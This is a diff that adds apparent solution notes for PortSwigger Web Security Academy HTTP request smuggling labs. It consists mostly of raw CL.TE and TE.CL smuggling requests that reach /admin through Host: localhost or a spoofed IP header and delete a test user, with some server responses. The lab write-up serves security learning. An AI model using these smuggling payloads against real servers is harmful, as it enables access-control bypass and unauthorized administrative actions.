@@ -121,3 +121,129 @@ x=1
 ```
 
 ## Exploiting HTTP request smuggling vulnerabilities
+
+### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+Send twice
+```
+POST /home HTTP/1.1
+Host: ac461f801f3658d180123126008b00e6.web-security-academy.net
+Cookie: session=icIVp2hLqiJ3lTmK0EBmbbVQFi8UzVny
+Transfer-Encoding: chunked
+Content-Length: 103
+
+0
+
+GET /admin HTTP/1.1
+Host: ac461f801f3658d180123126008b00e6.web-security-academy.net
+Foo: x
+
+---
+HTTP/1.1 401 Unauthorized
+...
+Admin interface only available if logged in as an administrator, or if requested as localhost
+```
+
+Add `Host: localhost` and make sure that the smuggled header is not overwritten:
+```
+POST /home HTTP/1.1
+Host: ac461f801f3658d180123126008b00e6.web-security-academy.net
+Cookie: session=icIVp2hLqiJ3lTmK0EBmbbVQFi8UzVny
+Transfer-Encoding: chunked
+Content-Length: 116
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+```
+
+Delete Carlos:
+```
+POST /home HTTP/1.1
+Host: ac461f801f3658d180123126008b00e6.web-security-academy.net
+Cookie: session=icIVp2hLqiJ3lTmK0EBmbbVQFi8UzVny
+Transfer-Encoding: chunked
+Content-Length: 139
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+```
+
+### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+Send twice
+```
+POST /home HTTP/1.1
+Host: ac6a1fa81f845ee4809d8af400a200d8.web-security-academy.net
+Cookie: session=EzC4LN9GCRzow1Np5ukNkgaFzcBSZbxf
+Transfer-Encoding: chunked
+Content-Length: 4
+
+86
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+0
+
+
+```
+
+### Exploiting HTTP request smuggling to reveal front-end request rewriting
+Send twice
+```
+POST / HTTP/1.1
+Host: aca81f6f1f164c0d80410728001800e5.web-security-academy.net
+Cookie: session=eA02we1aWNjS25qqGhpB726yEWhbmzpK
+Transfer-Encoding: chunked
+Content-Length: 124
+
+0
+
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+Connection: close
+
+search=test
+
+---
+
+<h1>0 search results for 'testPOST / HTTP/1.1
+X-dAEOCl-Ip: 78.102.57.9
+Host: aca81f6f1f164c0d80410728001800e5.web-security-academy.net
+Cookie: session=eA02we1aWNjS25qqGhpB726yEWhbmzpK
+Transfer-Encoding: chunked
+Con'</h1>
+```
+
+The header name is `X-dAEOCl-Ip`.
+
+Delete Carlos:
+```
+POST /home HTTP/1.1
+Host: aca81f6f1f164c0d80410728001800e5.web-security-academy.net
+Cookie: session=eA02we1aWNjS25qqGhpB726yEWhbmzpK
+Transfer-Encoding: chunked
+Content-Length: 146
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+X-dAEOCl-Ip: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+```
